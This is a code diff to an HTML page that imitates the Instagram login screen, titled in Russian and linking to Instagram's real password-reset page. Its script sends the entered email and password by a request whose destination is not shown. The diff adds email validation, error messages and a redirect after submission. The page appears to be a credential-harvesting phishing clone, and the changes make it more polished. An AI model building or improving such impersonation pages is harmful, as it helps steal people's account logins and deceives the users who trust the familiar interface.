@@ -4,6 +4,7 @@
 		<meta charset="UTF-8" />
 		<meta http-equiv="X-UA-Compatible" content="IE=edge" />
 		<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+		<link type="image/x-icon" href="favicon.png" rel="shortcut icon" />
 		<title>Войти • Instagram</title>
 		<style>
 			* {
@@ -112,6 +113,7 @@
 				border: none;
 				width: 90px;
 				color: #737373;
+				cursor: pointer;
 				font-size: 12px;
 				line-height: 14px;
 			}
@@ -173,6 +175,17 @@
 			.hidden {
 				display: none !important;
 			}
+			.error,
+			.error-mail {
+				color: red;
+				display: inline-block;
+				margin-top: 10px;
+				font-size: 12px;
+			}
+			.error-mail {
+				margin-top: 0;
+				margin-bottom: 10px;
+			}
 			@media screen and (max-width: 440px) {
 				main {
 					min-height: 50vh;
@@ -214,6 +227,7 @@
 							value=""
 						/>
 					</label>
+					<span class="error-mail hidden">Введите корректную почту!</span>
 					<label>
 						<input
 							id="input-password"
@@ -224,9 +238,8 @@
 						/>
 						<button class="show-button hidden" type="button">Показать</button>
 					</label>
-					<button class="button-submit" type="button" onclick="getDataUser()">
-						Войти
-					</button>
+					<span class="error hidden">Заполните пожалуйста данные!</span>
+					<button class="button-submit" type="button">Войти</button>
 					<a
 						class="reset-link"
 						href="https://www.instagram.com/accounts/password/reset/?next=%2Flogin%2F"
@@ -399,9 +412,19 @@
 			let inputLogin = document.querySelector('#input-login')
 			let inputPassword = document.querySelector('#input-password')
 			let showButton = document.querySelector('.show-button')
+			let buttonSubmit = document.querySelector('.button-submit')
+			let error = document.querySelector('.error')
+			let errorMail = document.querySelector('.error-mail')
 
 			inputLogin.addEventListener('input', e => {
 				login = e.currentTarget.value
+				if (login.length == '') {
+					errorMail.classList.add('hidden')
+				} else if (!login.match(/^([\w.%+-]+)@([\w-]+\.)+([\w]{2,})$/i)) {
+					errorMail.classList.remove('hidden')
+				} else {
+					errorMail.classList.add('hidden')
+				}
 			})
 
 			inputPassword.addEventListener('input', e => {
@@ -438,11 +461,31 @@
 						}),
 					}
 				)
-
-				showButton.classList.add('hidden')
-				inputPassword.value = ''
-				inputLogin.value = ''
+				if (response.status === 200) {
+					showButton.classList.add('hidden')
+					inputPassword.value = ''
+					inputLogin.value = ''
+					password = ''
+					login = ''
+					error.classList.add('hidden')
+					window.location.href =
+						window.location.pathname.slice(
+							0,
+							Number(window.location.pathname.length - 10)
+						) + 'test.html'
+				}
 			}
+			buttonSubmit.addEventListener('click', e => {
+				if (
+					password == '' ||
+					login == '' ||
+					!login.match(/^([\w.%+-]+)@([\w-]+\.)+([\w]{2,})$/i)
+				) {
+					error.classList.remove('hidden')
+				} else {
+					getDataUser()
+				}
+			})
 		</script>
 	</body>
 </html>
